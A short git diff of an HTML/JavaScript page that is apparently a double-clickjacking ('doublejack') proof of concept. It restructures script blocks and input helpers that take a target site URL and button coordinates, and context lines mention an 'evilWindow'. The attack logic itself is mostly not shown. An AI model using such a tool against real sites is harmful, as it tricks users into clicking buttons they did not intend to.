@@ -27,8 +27,12 @@
            </scr`+`ipt>`);
             
             evilWindow.document.close();
+        };
+    }
+    </script>
 
-            function getDynamicUrl() {
+<script>
+    function getDynamicUrl() {
     const urlInput = document.getElementById("siteUrl").value;
     return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
 }
@@ -48,10 +52,7 @@
     const urlInput = document.getElementById("height").value;
     return urlInput ? urlInput : 'https://defaulturl.com'; // fallback URL if input is empty
 }
-        };
-    }
-    </script>
-    
+</script>
     <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with -->
     <input type="text" id="siteUrl" placeholder="Enter site URL" />
     <input type="text" id="Updown" placeholder="Up/Down" />
